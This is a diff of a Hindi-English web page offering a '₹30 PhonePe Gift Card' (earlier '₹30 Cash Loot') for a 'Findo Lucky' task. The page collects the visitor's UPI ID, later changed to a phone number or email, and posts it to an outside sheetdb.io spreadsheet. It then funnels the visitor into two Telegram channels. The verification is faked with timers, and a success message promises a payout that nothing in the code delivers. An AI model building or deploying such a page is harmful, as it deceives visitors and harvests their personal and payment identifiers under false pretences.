@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get ₹30 Cash Loot - Findo Lucky</title>
+    <title>Get ₹30 PhonePe Gift Card</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { 
@@ -32,26 +32,26 @@
         }
         .loot-title { 
             color: #d81b60; 
-            font-size: 22px; 
+            font-size: 20px; 
             font-weight: 800; 
             margin-bottom: 5px; 
         }
         .subtitle { 
             color: #2e7d32; 
             font-weight: bold; 
-            font-size: 16px; 
+            font-size: 15px; 
             margin-bottom: 15px; 
         }
-        .cashback-box {
+        .reward-box {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
-            color: #2e7d32;
+            color: #5e35b1;
             margin-bottom: 15px;
-            background: #e8f5e9;
+            background: #ede7f6;
             padding: 10px;
             border-radius: 10px;
         }
@@ -113,65 +113,62 @@
 <body>
 
 <div class="card">
-    <!-- Aapki Image (Image.jpg) -->
-    <img src="Image.jpg" alt="Gift Box" class="logo-img">
+    <img src="Image.jpg" alt="Gift Card" class="logo-img">
     
-    <div class="loot-title">Get ₹30 Cash Loot</div>
+    <div class="loot-title">Get ₹30 PhonePe Gift Card</div>
     <div class="subtitle">Findo Lucky Special Task</div>
 
-    <div class="cashback-box">
-        <span>UPI</span>
-        <span>₹30 Instant Cashback</span>
+    <div class="reward-box">
+        <span>🎁 ₹30 PhonePe Gift Card</span>
     </div>
 
-    <!-- Step 1: UPI Form -->
+    <!-- Step 1: Input Form -->
     <div id="step1" class="step active">
-        <input type="text" id="upiId" placeholder="Enter Your UPI ID">
-        <button class="btn" onclick="submitUPI()">Submit & Complete Task</button>
+        <input type="text" id="contactInfo" placeholder="Enter Your Phone Number or Email">
+        <button class="btn" onclick="submitData()">Submit & Claim</button>
     </div>
 
-    <!-- Step 2: Complete Task Link -->
+    <!-- Step 2: Task Link -->
     <div id="step2" class="step">
         <p style="font-size:14px; color:#555;">Niche button par click karke <b>Findo Lucky Task</b> pura karein:</p>
         <button class="btn" onclick="openTask()">1. Go To Task Link</button>
     </div>
 
-    <!-- Step 3: Redirecting Animation -->
+    <!-- Step 3: Redirecting -->
     <div id="step3" class="step">
         <button class="btn">Task Processing...</button>
-        <div class="redirect-text">REDIRECTING TO TELEGRAM.....</div>
+        <div class="redirect-text">VERIFYING TASK.....</div>
     </div>
 
-    <!-- Step 4: Join 2 Telegram Channels -->
+    <!-- Step 4: Channels -->
     <div id="step4" class="step">
         <p style="font-size:14px; color:#555;">Verification ke liye <b>dono Channels</b> Join Karein:</p>
         <button class="btn btn-telegram" onclick="openChannel1()">2. Join Telegram Channel 1</button>
         <button class="btn btn-telegram" onclick="openChannel2()">3. Join Telegram Channel 2</button>
     </div>
 
-    <!-- Step 5: Verification Done & Final Success -->
+    <!-- Step 5: Success -->
     <div id="step5" class="step">
         <div class="success-box">
             <h3 style="color:#2e7d32; margin:0 0 10px 0;">✅ Verification Done!</h3>
             <p style="font-size: 15px; color: #333; margin: 0; font-weight: bold;">
-                Aapka cashback 36 se 48 ghante (36-48 Hours) ke andar aapke UPI account me credit ho jayega.
+                Aapka ₹30 PhonePe Gift Card 36-48 ghante me aapke diye gaye Phone Number/Email par send kar diya jayega.
             </p>
         </div>
     </div>
-
 </div>
 
 <script>
-    let savedUPI = "";
+    let savedInfo = "";
 
-    function submitUPI() {
-        savedUPI = document.getElementById('upiId').value;
-        if(!savedUPI) return alert("Kripya apni UPI ID daalein!");
+    function submitData() {
+        savedInfo = document.getElementById('contactInfo').value;
+        if(!savedInfo) return alert("Kripya apna Phone Number ya Email daalein!");
 
         fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ "UPI ID": savedUPI, "Status": "Started", "Date": new Date().toLocaleString() })
+            body: JSON.stringify({ "Contact Info": savedInfo, "Status": "Started", "Date": new Date().toLocaleString() })
         }).catch(err => console.log(err));
 
         document.getElementById('step1').classList.remove('active');
@@ -189,24 +186,17 @@
                 document.getElementById('step3').classList.remove('active');
                 document.getElementById('step4').classList.add('active');
             }, 3000);
-
         }, 1000);
     }
 
-    function openChannel1() {
-        window.open("https://t.me/findolucky", "_blank");
-    }
-
+    function openChannel1() { window.open("https://t.me/findolucky", "_blank"); }
     function openChannel2() {
         window.open("https://t.me/+PIzW1L82h2g2Y2Nl", "_blank");
-
         setTimeout(() => {
             document.getElementById('step4').classList.remove('active');
             document.getElementById('step5').classList.add('active');
         }, 1500);
     }
 </script>
-
 </body>
 </html>
-
